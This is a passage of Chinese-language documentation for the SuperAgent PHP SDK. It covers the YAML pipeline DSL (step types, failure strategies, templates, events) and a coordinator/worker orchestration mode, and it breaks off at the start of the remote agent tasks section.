# SuperAgent 高级用法指南

> SuperAgent SDK 所有高级功能的完整文档。本指南涵盖 25 个功能，分为 7 大类，从多智能体编排到性能优化与结构化日志。

> **语言**: [English](ADVANCED_USAGE.md) | [中文](ADVANCED_USAGE_CN.md) | [Français](ADVANCED_USAGE_FR.md)

## 目录

### 多智能体与编排

- [1. 流水线 DSL](#1-流水线-dsl)
- [2. 协调器模式](#2-协调器模式)
- [3. 远程 Agent 任务与触发器](#3-远程-agent-任务与触发器)

### 安全与权限

- [4. 权限系统](#4-权限系统)
- [5. Hook 系统](#5-hook-系统)
- [6. 护栏规则 DSL](#6-护栏规则-dsl)
- [7. Bash 安全验证器](#7-bash-安全验证器)

### 成本与资源管理

- [8. 成本自动驾驶](#8-成本自动驾驶)
- [9. Token 预算续航](#9-token-预算续航)
- [10. 智能上下文窗口](#10-智能上下文窗口)

### 智能与学习

- [11. 自适应反馈](#11-自适应反馈)
- [12. 技能蒸馏](#12-技能蒸馏)
- [13. 记忆系统](#13-记忆系统)
- [14. 知识图谱](#14-知识图谱)
- [15. 扩展思考](#15-扩展思考)

### 基础设施与集成

- [16. MCP 协议集成](#16-mcp-协议集成)
- [17. 桥接模式](#17-桥接模式)
- [18. 遥测与可观测性](#18-遥测与可观测性)
- [19. 工具搜索与延迟加载](#19-工具搜索与延迟加载)
- [20. 增量与懒加载上下文](#20-增量与懒加载上下文)

### 开发工作流

- [21. Plan V2 访谈阶段](#21-plan-v2-访谈阶段)
- [22. 检查点与恢复](#22-检查点与恢复)
- [23. 文件历史](#23-文件历史)

### 性能与日志 (v0.7.0)

- [24. 性能优化](#24-性能优化)
- [25. NDJSON 结构化日志](#25-ndjson-结构化日志)

### 创新智能 (v0.7.6)

- [26. Agent Replay 时间旅行调试](#26-agent-replay-时间旅行调试)
- [27. 对话分叉](#27-对话分叉)
- [28. Agent 辩论协议](#28-agent-辩论协议)
- [29. 成本预测引擎](#29-成本预测引擎)
- [30. 自然语言护栏](#30-自然语言护栏)
- [31. 自愈流水线](#31-自愈流水线)

### Agent Harness 模式 + 企业级子系统 (v0.7.8)

- [32. 持久化任务管理器](#32-持久化任务管理器)
- [33. 会话管理器](#33-会话管理器)
- [34. StreamEvent 统一事件架构](#34-streamevent-统一事件架构)
- [35. Harness REPL 交互循环](#35-harness-repl-交互循环)
- [36. 自动压缩器](#36-自动压缩器)
- [37. E2E 场景测试框架](#37-e2e-场景测试框架)
- [38. Worktree 管理器](#38-worktree-管理器)
- [39. Tmux 后端](#39-tmux-后端)
- [40. API 重试中间件](#40-api-重试中间件)
- [41. iTerm2 后端](#41-iterm2-后端)
- [42. 插件系统](#42-插件系统)
- [43. 可观察应用状态](#43-可观察应用状态)
- [44. Hook 热重载](#44-hook-热重载)
- [45. Prompt & Agent Hook](#45-prompt--agent-hook)
- [46. 多通道网关](#46-多通道网关)
- [47. 后端协议](#47-后端协议)
- [48. OAuth 设备码流程](#48-oauth-设备码流程)
- [49. 权限路径规则](#49-权限路径规则)
- [50. 协调器任务通知](#50-协调器任务通知)

---

## 1. 流水线 DSL

> 以声明式 YAML 流水线定义多步骤 agent 工作流，支持依赖解析、失败策略、审批门控和迭代审查修复循环。

### 概述

流水线 DSL 让你无需编写命令式 PHP 代码即可编排复杂的 agent 工作流。你在 YAML 中定义流水线，指定步骤（agent 调用、并行组、条件、转换、审批门控、循环）、它们的依赖关系和失败策略。`PipelineEngine` 通过拓扑排序解析执行顺序，通过模板变量管理步骤间的数据流，并发出事件以支持可观测性。

核心类：

| 类 | 角色 |
|---|---|
| `PipelineConfig` | 解析和验证 YAML 流水线文件 |
| `PipelineDefinition` | 单个流水线的不可变定义 |
| `PipelineEngine` | 执行带依赖解析的流水线 |
| `PipelineContext` | 运行时状态：输入、步骤结果、模板解析 |
| `PipelineResult` | 完整流水线运行的结果 |
| `StepFactory` | 将 YAML 步骤数组解析为 `StepInterface` 对象 |

### 配置

#### YAML 文件结构

```yaml
version: "1.0"

defaults:
  failure_strategy: abort   # abort | continue | retry
  timeout: 300              # 每步超时（秒）
  max_retries: 0            # 默认重试次数

pipelines:
  pipeline-name:
    description: "人类可读的描述"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"
    steps:
      - name: step-name
        agent: agent-type
        prompt: "用 {{inputs.files}} 做些事情"
        # ... 步骤特定配置
    outputs:
      report: "{{steps.build-report.output}}"
    triggers:
      - event: push
    metadata:
      team: platform
```

#### 加载配置

```php
use SuperAgent\Pipeline\PipelineConfig;

// 单个文件
$config = PipelineConfig::fromYamlFile('pipelines.yaml');

// 多个文件（后面的文件覆盖同名流水线）
$config = PipelineConfig::fromYamlFiles([
    'pipelines/base.yaml',
    'pipelines/team-overrides.yaml',
]);

// 从数组加载（适用于测试）
$config = PipelineConfig::fromArray([
    'version' => '1.0',
    'defaults' => ['failure_strategy' => 'abort'],
    'pipelines' => [
        'my-pipeline' => [
            'steps' => [/* ... */],
        ],
    ],
]);

// 验证
$errors = $config->validate();
if (!empty($errors)) {
    foreach ($errors as $error) {
        echo "验证错误: {$error}\n";
    }
}
```

### 用法

#### 运行流水线

```php
use SuperAgent\Pipeline\PipelineConfig;
use SuperAgent\Pipeline\PipelineEngine;
use SuperAgent\Pipeline\Steps\AgentStep;
use SuperAgent\Pipeline\PipelineContext;

$config = PipelineConfig::fromYamlFile('pipelines.yaml');
$engine = new PipelineEngine($config);

// 设置 agent 运行器（agent 步骤必需）
$engine->setAgentRunner(function (AgentStep $step, PipelineContext $ctx): string {
    // 与你的 agent 后端集成
    $spawnConfig = $step->buildSpawnConfig($ctx);
    return $backend->run($spawnConfig);
});

// 设置审批处理器（可选；未设置时自动批准）
$engine->setApprovalHandler(function (\SuperAgent\Pipeline\Steps\ApprovalStep $step, PipelineContext $ctx): bool {
    echo "需要审批: {$step->getMessage()}\n";
    return readline("批准？(y/n) ") === 'y';
});

// 注册事件监听器
$engine->on('pipeline.start', function (array $data) {
    echo "开始流水线: {$data['pipeline']} ({$data['steps']} 个步骤)\n";
});

$engine->on('step.end', function (array $data) {
    echo "步骤 {$data['step']}: {$data['status']} ({$data['duration_ms']}ms)\n";
});

// 运行流水线
$result = $engine->run('code-review', [
    'files' => ['src/App.php', 'src/Service.php'],
    'branch' => 'feature/new-api',
]);

// 检查结果
if ($result->isSuccessful()) {
    echo "流水线完成！\n";
    $summary = $result->getSummary();
    echo "步骤: {$summary['completed']} 已完成, {$summary['failed']} 失败\n";
} else {
    echo "流水线失败: {$result->error}\n";
}

// 访问单个步骤输出
$scanOutput = $result->getStepOutput('security-scan');
$allOutputs = $result->getAllOutputs();
```

### YAML 参考

#### 步骤类型

##### 1. Agent 步骤

使用提示模板执行指定的 agent。

```yaml
- name: security-scan
  agent: security-scanner          # agent 类型名称
  prompt: "扫描 {{inputs.files}} 的安全漏洞"
  model: claude-haiku-4-5-20251001         # 可选：覆盖模型
  system_prompt: "你是一名安全专家" # 可选
  isolation: subprocess            # 可选：subprocess | docker | none
  read_only: true                  # 可选：限制为只读工具
  allowed_tools:                   # 可选：限制可用工具
    - Read
    - Grep
    - Glob
  input_from:                      # 可选：注入前序步骤的上下文
    scan_results: "{{steps.scan.output}}"
    config: "{{steps.load-config.output}}"
  on_failure: retry                # abort | continue | retry
  max_retries: 2
  timeout: 120
  depends_on:
    - load-config
```

`input_from` 映射会作为标记的上下文部分附加到提示中：

```
## 前序步骤的上下文

### scan_results
<steps.scan 解析后的输出>

### config
<steps.load-config 解析后的输出>
```

##### 2. 并行步骤

并发运行多个子步骤（目前在 PHP 中为顺序执行，但语义上是并行的）。

```yaml
- name: all-checks
  parallel:
    - name: security-scan
      agent: security-scanner
      prompt: "检查安全问题"
    - name: style-check
      agent: style-checker
      prompt: "检查代码风格"
    - name: test-coverage
      agent: test-runner
      prompt: "运行测试并报告覆盖率"
  wait_all: true                   # 默认：true；等待所有子步骤
  on_failure: continue
```

##### 3. 条件步骤

用 `when` 子句包装任意步骤。条件不满足时跳过该步骤。

```yaml
- name: deploy
  when:
    step_succeeded: all-tests      # 仅当 all-tests 完成时
  agent: deployer
  prompt: "部署更改"
  depends_on:
    - all-tests

- name: notify-failure
  when:
    step_failed: all-tests         # 仅当 all-tests 失败时
  agent: notifier
  prompt: "通知团队: {{steps.all-tests.error}}"

- name: production-deploy
  when:
    input_equals:
      field: environment
      value: production
  agent: deployer
  prompt: "部署到生产环境"

- name: hotfix
  when:
    expression:
      left: "{{steps.scan.status}}"
      operator: eq
      right: completed
  agent: fixer
  prompt: "应用热修复"
```

条件类型：

| 类型 | 格式 | 描述 |
|---|---|---|
| `step_succeeded` | `step_succeeded: step-name` | 指定步骤成功完成时为真 |
| `step_failed` | `step_failed: step-name` | 指定步骤失败时为真 |
| `input_equals` | `{ field: "key", value: "expected" }` | 流水线输入匹配时为真 |
| `output_contains` | `{ step: "name", contains: "text" }` | 步骤输出包含子字符串时为真 |
| `expression` | `{ left, operator, right }` | 比较（eq, neq, contains, gt, gte, lt, lte） |

##### 4. 审批步骤

暂停流水线并等待人工审批。

```yaml
- name: deploy-gate
  approval:
    message: "所有检查已通过。部署到生产环境？"
    required_approvers: 1
    timeout: 3600                  # 等待审批的秒数
  depends_on:
    - all-checks
```

如果引擎上没有注册 `approvalHandler` 回调，审批门控将自动批准并显示警告。

##### 5. 转换步骤

聚合或重塑前序步骤的数据，无需调用 agent。

```yaml
## 合并多个输出
- name: aggregate
  transform:
    type: merge
    sources:
      security: "{{steps.security-scan.output}}"
      style: "{{steps.style-check.output}}"
      tests: "{{steps.test-coverage.output}}"

## 从模板构建报告
- name: report
  transform:
    type: template
    template: |
      # 代码审查报告
      ## 安全: {{steps.security-scan.status}}
      {{steps.security-scan.output}}
      ## 风格: {{steps.style-check.status}}
      {{steps.style-check.output}}

## 从步骤输出中提取字段
- name: get-score
  transform:
    type: extract
    step: analysis
    field: score

## 对数组输出执行映射
- name: format-items
  transform:
    type: map
    step: list-step
    template: "- {{vars.item}}"
```

转换类型：

| 类型 | 描述 |
|---|---|
| `merge` | 通过 `sources` 映射将多个步骤输出合并为一个对象 |
| `template` | 使用 `{{...}}` 变量解析渲染字符串模板 |
| `extract` | 从 `step` 的输出中提取特定 `field` |
| `map` | 对数组输出的每个元素应用模板 |

##### 6. 循环步骤

重复执行一组步骤，直到满足退出条件或达到迭代限制。专为审查修复循环设计。

```yaml
- name: review-fix-loop
  loop:
    max_iterations: 5              # 必需：防止无限循环
    exit_when:
      output_contains:
        step: review
        contains: "LGTM"
    steps:
      - name: review
        agent: reviewer
        prompt: "审查代码中的 bug"
      - name: fix
        agent: code-writer
        prompt: "修复问题: {{steps.review.output}}"
        when:
          expression:
            left: "{{steps.review.output}}"
            operator: contains
            right: "BUG"
```

**多模型审查循环：**

```yaml
- name: multi-review-loop
  loop:
    max_iterations: 3
    exit_when:
      all_passed:
        - step: claude-review
          contains: "LGTM"
        - step: gpt-review
          contains: "LGTM"
    steps:
      - name: reviews
        parallel:
          - name: claude-review
            agent: reviewer
            model: claude-sonnet-4-20250514
            prompt: "审查逻辑 bug"
          - name: gpt-review
            agent: reviewer
            model: gpt-4o
            prompt: "审查安全问题"
      - name: fix
        agent: code-writer
        prompt: "修复所有发现的问题"
        input_from:
          claude: "{{steps.claude-review.output}}"
          gpt: "{{steps.gpt-review.output}}"
```

退出条件类型：

| 类型 | 格式 | 描述 |
|---|---|---|
| `output_contains` | `{ step, contains }` | 步骤输出包含子字符串 |
| `output_not_contains` | `{ step, contains }` | 步骤输出不包含子字符串 |
| `expression` | `{ left, operator, right }` | 比较表达式 |
| `all_passed` | `{ step, contains }` 数组 | 所有列出的步骤都包含其子字符串 |
| `any_passed` | `{ step, contains }` 数组 | 任一列出的步骤包含其子字符串 |

循环迭代元数据可在模板中访问：

- `{{loop.<loop-name>.iteration}}` -- 当前基于 1 的迭代编号
- `{{loop.<loop-name>.max}}` -- 配置的最大迭代次数

每次迭代会覆盖上次迭代的步骤结果，因此 `{{steps.review.output}}` 始终指向最近一次迭代。

#### 失败策略

| 策略 | 行为 |
|---|---|
| `abort` | 步骤失败时立即停止流水线 |
| `continue` | 记录失败并继续下一步骤 |
| `retry` | 在应用 abort/continue 之前，最多重试 `max_retries` 次 |

#### 依赖解析

步骤可以通过 `depends_on` 声明依赖。引擎使用拓扑排序（Kahn 算法）确定执行顺序。如果没有依赖存在，步骤按声明顺序运行。

```yaml
steps:
  - name: scan
    agent: scanner
    prompt: "扫描代码"

  - name: review
    agent: reviewer
    prompt: "审查 {{steps.scan.output}}"
    depends_on:
      - scan

  - name: fix
    agent: fixer
    prompt: "修复 {{steps.review.output}}"
    depends_on:
      - review
```

如果依赖尚未成功完成，依赖步骤将以"依赖未满足"消息被跳过。

循环依赖会被检测并记录日志；引擎会回退到原始声明顺序。

#### 步骤间数据流（模板）

模板使用 `{{...}}` 语法，由 `PipelineContext` 在运行时解析：

| 模式 | 描述 |
|---|---|
| `{{inputs.key}}` | 流水线输入值 |
| `{{steps.name.output}}` | 步骤输出（字符串或 JSON 编码） |
| `{{steps.name.status}}` | 步骤状态：`completed`、`failed`、`skipped` |
| `{{steps.name.error}}` | 步骤错误消息（如果失败） |
| `{{vars.key}}` | 执行期间设置的自定义变量 |
| `{{loop.name.iteration}}` | 当前循环迭代（基于 1） |
| `{{loop.name.max}}` | 循环的最大迭代次数 |

未解析的占位符在输出字符串中保持原样。数组/对象值会被 JSON 编码。

#### 流水线输出

定义在流水线完成后解析的输出模板：

```yaml
pipelines:
  code-review:
    outputs:
      report: "{{steps.build-report.output}}"
      score: "{{steps.scoring.output}}"
    steps:
      # ...
```

在 PHP 中解析：

```php
$result = $engine->run('code-review', $inputs);
$context = new PipelineContext($inputs);
// ... 用步骤结果填充上下文
$outputs = $pipeline->resolveOutputs($context);
```

#### 事件监听器

引擎在整个执行过程中发出事件。使用 `$engine->on()` 注册监听器：

| 事件 | 数据键 | 描述 |
|---|---|---|
| `pipeline.start` | `pipeline`, `inputs`, `steps` | 流水线开始执行 |
| `pipeline.end` | `pipeline`, `status`, `duration_ms`, `summary` | 流水线执行结束 |
| `step.start` | `step`, `description` | 步骤开始执行 |
| `step.end` | `step`, `status`, `duration_ms` | 步骤完成 |
| `step.retry` | `step`, `attempt`, `max_attempts`, `error` | 步骤正在重试 |
| `step.skip` | `step` | 步骤被跳过 |
| `loop.iteration` | `loop`, `iteration`, `max_iterations` | 循环迭代开始 |

```php
$engine->on('step.retry', function (array $data) {
    $logger->warning("正在重试 {$data['step']}", [
        'attempt' => $data['attempt'],
        'error' => $data['error'],
    ]);
});

$engine->on('loop.iteration', function (array $data) {
    echo "循环 {$data['loop']}: 迭代 {$data['iteration']}/{$data['max_iterations']}\n";
});
```

### API 参考

#### `PipelineConfig`

| 方法 | 描述 |
|---|---|
| `fromYamlFile(string $path): self` | 从 YAML 文件加载 |
| `fromYamlFiles(array $paths): self` | 合并多个 YAML 文件 |
| `fromArray(array $data): self` | 从数组加载 |
| `validate(): string[]` | 验证并返回错误消息 |
| `getPipeline(string $name): ?PipelineDefinition` | 按名称获取流水线 |
| `getPipelines(): PipelineDefinition[]` | 获取所有流水线 |
| `getPipelineNames(): string[]` | 获取所有流水线名称 |
| `getVersion(): string` | 配置版本 |
| `getDefaultTimeout(): int` | 默认超时（秒） |
| `getDefaultFailureStrategy(): string` | 默认失败策略 |

#### `PipelineEngine`

| 方法 | 描述 |
|---|---|
| `__construct(PipelineConfig $config, ?LoggerInterface $logger)` | 创建引擎 |
| `setAgentRunner(callable $runner): void` | 设置 agent 执行回调：`fn(AgentStep, PipelineContext): string` |
| `setApprovalHandler(callable $handler): void` | 设置审批回调：`fn(ApprovalStep, PipelineContext): bool` |
| `on(string $event, callable $listener): void` | 注册事件监听器 |
| `run(string $pipelineName, array $inputs): PipelineResult` | 运行指定流水线 |
| `reload(PipelineConfig $config): void` | 热重载配置 |
| `getPipelineNames(): string[]` | 列出可用流水线 |
| `getPipeline(string $name): ?PipelineDefinition` | 获取流水线定义 |
| `getStatistics(): array` | 获取 `{pipelines, total_steps}` 计数 |

#### `PipelineResult`

| 方法 | 描述 |
|---|---|
| `isSuccessful(): bool` | 状态为 `completed` 时返回 true |
| `getStepResults(): StepResult[]` | 所有步骤结果 |
| `getStepResult(string $name): ?StepResult` | 特定步骤的结果 |
| `getStepOutput(string $name): mixed` | 特定步骤的输出 |
| `getAllOutputs(): array` | 按步骤名称索引的所有输出 |
| `getSummary(): array` | 包含已完成/失败/跳过计数的摘要 |

#### `PipelineDefinition`

| 方法 | 描述 |
|---|---|
| `validateInputs(array $inputs): string[]` | 验证必需输入 |
| `applyInputDefaults(array $inputs): array` | 应用默认值 |
| `resolveOutputs(PipelineContext $ctx): array` | 解析输出模板 |
| `hasTrigger(string $event): bool` | 检查流水线是否有触发器 |

### 示例

#### 完整代码审查流水线

```yaml
version: "1.0"

defaults:
  failure_strategy: continue
  timeout: 120

pipelines:
  code-review:
    description: "自动代码审查，包含安全扫描、风格检查和报告"
    inputs:
      - name: files
        type: array
        required: true
      - name: branch
        type: string
        default: "main"

    steps:
      - name: security-scan
        agent: security-scanner
        prompt: "扫描这些文件的安全漏洞: {{inputs.files}}"
        model: claude-haiku-4-5-20251001
        read_only: true
        timeout: 60

      - name: style-check
        agent: style-checker
        prompt: "检查代码风格: {{inputs.files}}"
        read_only: true
        timeout: 60

      - name: review-fix-loop
        loop:
          max_iterations: 3
          exit_when:
            output_contains:
              step: review
              contains: "LGTM"
          steps:
            - name: review
              agent: code-reviewer
              prompt: "审查代码中的 bug 和逻辑错误"
            - name: fix
              agent: code-writer
              prompt: "修复发现的问题: {{steps.review.output}}"
              when:
                expression:
                  left: "{{steps.review.output}}"
                  operator: contains
                  right: "ISSUE"
        depends_on:
          - security-scan
          - style-check

      - name: deploy-gate
        approval:
          message: "审查完成。部署分支 {{inputs.branch}}？"
          timeout: 3600
        depends_on:
          - review-fix-loop

      - name: build-report
        transform:
          type: template
          template: |
            # 代码审查报告
            分支: {{inputs.branch}}
            ## 安全: {{steps.security-scan.status}}
            {{steps.security-scan.output}}
            ## 风格: {{steps.style-check.status}}
            {{steps.style-check.output}}
            ## 审查循环
            {{steps.review-fix-loop.output}}
        depends_on:
          - review-fix-loop

    outputs:
      report: "{{steps.build-report.output}}"

    triggers:
      - event: pull_request
```

### 故障排除

**"Pipeline 'name' not found"** -- 加载的配置中不存在该流水线名称。检查 YAML 文件并确保 `PipelineConfig` 加载成功。

**"Missing required input: 'x'"** -- 流水线声明了必需输入，但未在 `$engine->run()` 中提供。

**"Step 'x' must specify one of: agent, parallel, approval, transform, loop"** -- YAML 步骤定义缺少可识别的类型键。

**"Circular dependency detected"** -- 两个或多个步骤相互依赖。引擎会记录警告并回退到声明顺序。

**"AgentStep::runAgent() should not be called directly"** -- 必须使用 `PipelineEngine` 并通过 `setAgentRunner()` 设置 agent 运行器。Agent 步骤不能独立执行。

**"No approval handler configured, auto-approving"** -- 如果需要人工介入的审批门控，请在引擎上注册 `approvalHandler`。

---

## 2. 协调器模式

> 双模式架构，将编排（协调器）与执行（工作器）分离，具有工具限制、4 阶段工作流和会话持久化。

### 概述

协调器模式实现了**编排**和**执行**之间的严格分离。启用后，顶层 agent 变为纯协调器，永远不直接执行任务。它：

1. **生成**独立的工作器 agent（通过 `Agent` 工具）
2. **接收**任务通知形式的结果
3. **综合**发现为实现规格
4. **委派**所有工作给工作器

这种架构防止协调器陷入实现细节，确保每个工作器在聚焦、自包含的上下文中运行。

#### 双模式架构

```
                     +-------------------+
                     |   协调器          |
                     | (Agent, SendMsg,  |
                     |  TaskStop only)   |
                     +--------+----------+
                              |
              +---------------+---------------+
              |               |               |
       +------+------+ +-----+-------+ +-----+-------+
       |  工作器 A   | |  工作器 B   | |  工作器 C   |
       | (Bash, Read,| | (Bash, Read,| | (Bash, Read,|
       |  Edit, etc.)| |  Edit, etc.)| |  Edit, etc.)|
       +-------------+ +-------------+ +-------------+
```

| 角色 | 可用工具 | 目的 |
|------|----------------|---------|
| **协调器** | `Agent`, `SendMessage`, `TaskStop` | 编排、综合、委派 |
| **工作器** | `Bash`, `Read`, `Edit`, `Write`, `Grep`, `Glob` 等 | 直接执行任务 |

工作器永远无法访问 `SendMessage`、`TeamCreate` 或 `TeamDelete`（内部编排工具）。

### 配置

#### 启用协调器模式

```php
use SuperAgent\Coordinator\CoordinatorMode;

// 通过构造函数启用
$coordinator = new CoordinatorMode(coordinatorMode: true);

// 通过环境变量启用
// export CLAUDE_CODE_COORDINATOR_MODE=1
// 或
// export CLAUDE_CODE_COORDINATOR_MODE=true
$coordinator = new CoordinatorMode(); // 自动从环境检测

// 运行时启用/禁用
$coordinator->enable();
$coordinator->disable();

// 检查当前状态
$coordinator->isCoordinatorMode(); // true 或 false
$coordinator->getSessionMode();     // 'coordinator' 或 'normal'
```

#### 使用 CoordinatorAgent 定义

预配置的协调器 agent：

```php
use SuperAgent\Agent\BuiltinAgents\CoordinatorAgent;

$agent = new CoordinatorAgent();
$agent->name();          // 'coordinator'
$agent->description();   // 'Orchestrator that delegates work to worker agents'
$agent->allowedTools();  // ['Agent', 'SendMessage', 'TaskStop']
$agent->readOnly();      // true（协调器永远不写文件）
$agent->category();      // 'orchestration'
$agent->systemPrompt();  // 完整的协调器系统提示
```

### 用法

#### 工具过滤

`CoordinatorMode` 类处理双方的工具限制：

```php
$coordinator = new CoordinatorMode(coordinatorMode: true);

// 为协调器过滤工具（仅编排工具）
$coordTools = $coordinator->filterCoordinatorTools($allTools);
// 仅：Agent, SendMessage, TaskStop

// 为工作器过滤工具（移除内部编排工具）
$workerTools = $coordinator->filterWorkerTools($allTools);
// 除 SendMessage, TeamCreate, TeamDelete 外的所有工具

// 获取工作器工具名称（用于注入协调器上下文）
$workerToolNames = $coordinator->getWorkerToolNames($allTools);
// ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob', ...]
```

#### 系统提示

协调器系统提示定义了完整的编排协议：

```php
$coordinator = new CoordinatorMode(true);

$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    scratchpadDir: '/tmp/scratchpad',
);
```

#### 用户上下文消息

作为第一条用户消息注入，通知协调器关于工作器能力：

```php
$userContext = $coordinator->getUserContext(
    workerToolNames: ['Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob'],
    mcpToolNames: ['mcp_github_create_pr', 'mcp_linear_create_issue'],
    scratchpadDir: '/tmp/scratchpad',
);
// "通过 Agent 工具生成的工作器可以访问这些工具: Bash, Read, Edit, ...
//  工作器还可以访问 MCP 工具: mcp_github_create_pr, mcp_linear_create_issue
//  暂存目录: /tmp/scratchpad ..."
```

#### 会话模式持久化

恢复会话时，协调器模式应与存储的会话状态匹配：

```php
$coordinator = new CoordinatorMode();

// 恢复协调器会话
$warning = $coordinator->matchSessionMode('coordinator');
// 返回: "Entered coordinator mode to match resumed session."

// 在协调器模式下恢复普通会话
$coordinator->enable();
$warning = $coordinator->matchSessionMode('normal');
// 返回: "Exited coordinator mode to match resumed session."

// 无需更改
$warning = $coordinator->matchSessionMode('normal');
// 返回: null（已经是普通模式）
```

### 4 阶段工作流

协调器系统提示定义了严格的工作流：

#### 阶段 1：研究

| 负责方 | 工作器（并行） |
|-------|-------------------|
| **目的** | 独立调查代码库 |
| **方式** | 在一条消息中生成多个只读工作器 |

```
协调器: "我需要了解支付系统。让我生成研究工作器。"

工作器 A: 调查 src/Payment/ 目录结构和关键类
工作器 B: 读取 tests/Payment/ 中的所有测试文件以了解预期行为
工作器 C: 检查配置文件和环境变量中的支付设置
```

#### 阶段 2：综合

| 负责方 | 协调器 |
|-------|-------------|
| **目的** | 阅读发现、理解问题、制定实现规格 |
| **方式** | 阅读所有工作器结果，然后编写具体的实现规格 |

协调器**绝不委派理解**。它阅读所有研究结果并制定包含文件路径、行号、类型和理由的具体计划。

#### 阶段 3：实现

| 负责方 | 工作器 |
|-------|---------|
| **目的** | 按照协调器的规格进行更改 |
| **方式** | 顺序写入 -- 每次只有一个写入工作器处理一组文件 |

```
协调器: "根据我的分析，以下是实现规格：
  文件: src/Payment/StripeGateway.php, 第 45 行
  更改: 在处理之前添加 webhook 签名验证
  类型: 添加方法 verifyWebhookSignature(string $payload, string $signature): bool
  原因: 当前实现在不验证的情况下处理 webhook（安全风险）"
```

#### 阶段 4：验证

| 负责方 | 全新工作器 |
|-------|--------------|
| **目的** | 独立测试更改 |
| **方式** | 始终使用全新工作器（独立视角） |

```
协调器: "生成一个全新工作器来运行测试套件并验证更改。"

工作器 D（全新）: 运行测试，检查回归，验证新行为
```

### 继续 vs. 生成决策

协调器必须决定是继续现有工作器还是生成全新工作器：

| 场景 | 操作 | 原因 |
|-----------|--------|-----|
| 研究探索了需要编辑的文件 | **继续**（SendMessage） | 工作器上下文中有文件 |
| 研究范围广，实现范围窄 | **生成全新** | 避免拖入噪音 |
| 纠正失败或扩展工作 | **继续** | 工作器知道它尝试了什么 |
| 验证另一个工作器的代码 | **生成全新** | 独立视角 |
| 方法完全错误 | **生成全新** | 全新开始 |

#### 任务通知

工作器完成后，协调器接收 XML 通知：

```xml
<task-notification>
  <task-id>agent-xxx</task-id>
  <status>completed|failed|killed</status>
  <summary>人类可读的结果</summary>
  <result>Agent 的最终响应</result>
</task-notification>
```

#### 暂存目录

工作器可以通过暂存目录共享信息：

```php
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $toolNames,
    scratchpadDir: '/tmp/project-scratchpad',
);
// 工作器可以在不需要权限提示的情况下读写暂存目录。
// 用于持久的跨工作器知识。
```

### API 参考

#### `CoordinatorMode`

| 方法 | 返回值 | 描述 |
|--------|--------|-------------|
| `isCoordinatorMode()` | `bool` | 协调器模式是否激活 |
| `enable()` | `void` | 激活协调器模式 |
| `disable()` | `void` | 停用协调器模式 |
| `getSessionMode()` | `string` | `'coordinator'` 或 `'normal'` |
| `matchSessionMode(string $storedMode)` | `?string` | 匹配存储的会话模式；如果切换则返回警告 |
| `filterCoordinatorTools(array $tools)` | `array` | 仅过滤编排工具 |
| `filterWorkerTools(array $tools)` | `array` | 移除内部编排工具 |
| `getWorkerToolNames(array $tools)` | `string[]` | 获取工作器可用的工具名称 |
| `getSystemPrompt(array $workerToolNames, ?string $scratchpadDir)` | `string` | 获取完整的协调器系统提示 |
| `getUserContext(array $workerToolNames, array $mcpToolNames, ?string $scratchpadDir)` | `string` | 获取用户上下文注入消息 |

#### 常量

| 常量 | 值 | 描述 |
|----------|-------|-------------|
| `COORDINATOR_TOOLS` | `['Agent', 'SendMessage', 'TaskStop']` | 协调器可用的工具 |

#### `CoordinatorAgent` (AgentDefinition)

| 方法 | 返回值 | 描述 |
|--------|--------|-------------|
| `name()` | `string` | `'coordinator'` |
| `description()` | `string` | Agent 描述 |
| `systemPrompt()` | `?string` | 完整的协调器系统提示 |
| `allowedTools()` | `?array` | `['Agent', 'SendMessage', 'TaskStop']` |
| `readOnly()` | `bool` | `true` |
| `category()` | `string` | `'orchestration'` |

### 示例

#### 设置协调器会话

```php
use SuperAgent\Coordinator\CoordinatorMode;

// 创建协调器
$coordinator = new CoordinatorMode(coordinatorMode: true);

// 获取所有工具
$allTools = $toolRegistry->getAll();

// 为协调器过滤
$coordTools = $coordinator->filterCoordinatorTools($allTools);
$workerToolNames = $coordinator->getWorkerToolNames($allTools);

// 构建系统提示
$systemPrompt = $coordinator->getSystemPrompt(
    workerToolNames: $workerToolNames,
    scratchpadDir: '/tmp/scratchpad',
);

// 构建用户上下文
$userContext = $coordinator->getUserContext(
    workerToolNames: $workerToolNames,
    mcpToolNames: ['mcp_github_create_pr'],
    scratchpadDir: '/tmp/scratchpad',
);

// 使用仅协调器工具配置查询引擎
$engine = new QueryEngine(
    provider: $provider,
    tools: $coordTools,
    systemPrompt: $systemPrompt,
    options: $options,
);
```

#### 应避免的反模式

```php
// 错误：协调器委派理解
// "根据你的发现，修复这个 bug"
// 协调器应该阅读发现并编写具体规格。

// 错误：在通知到达前预测结果
// 不要假设工作器会发现什么；等待通知。

// 错误：使用一个工作器检查另一个工作器
// 始终使用全新工作器进行验证。

// 错误：生成工作器时不提供具体上下文
// 始终包含文件路径、行号、类型和理由。
```

### 何时使用协调器模式

**使用协调器模式的场景：**

- 任务涉及多个文件或子系统，受益于并行调查
- 你需要严格分离计划和执行
- 任务需要先研究后实现的工作流
- 你需要独立验证更改
- 代码库很大，工作器受益于聚焦的上下文

**使用普通模式（单 agent）的场景：**

- 任务简单且定义明确（如修复拼写错误、添加导入）
- 任务仅涉及一两个文件
- 速度比彻底调查更重要
- 对话是交互式的，需要快速来回

### 故障排除

#### 协调器尝试直接执行工具

- 验证在传递给引擎之前已应用了 `filterCoordinatorTools()`。
- 检查过滤列表中是否只有 `Agent`、`SendMessage` 和 `TaskStop`。

#### 工作器没有接收到完整上下文

- 工作器提示必须是自包含的。包含所有文件路径、行号、代码片段和理由。
- 工作器看不到协调器的对话。不要引用"我们讨论过的文件"。

#### 恢复后会话模式不匹配

- 恢复会话时调用 `matchSessionMode($storedMode)` 以确保协调器模式匹配。
- 如果发生模式切换，该方法返回警告字符串。

#### 环境变量未被检测到

- 设置 `CLAUDE_CODE_COORDINATOR_MODE=1` 或 `CLAUDE_CODE_COORDINATOR_MODE=true`。
- 检测发生在构造函数中；如果在设置环境变量之前创建对象，它将不会检测到。

---

## 3. 远程 Agent 任务与触发器

> 通过 Anthropic API 在进程外执行 agent，使用 cron 表达式调度重复任务，以及以编程方式管理触发器。远程 agent 作为完全隔离的会话运行，具有独立的工具集、git 检出和可选的 MCP 连接。

### 概述

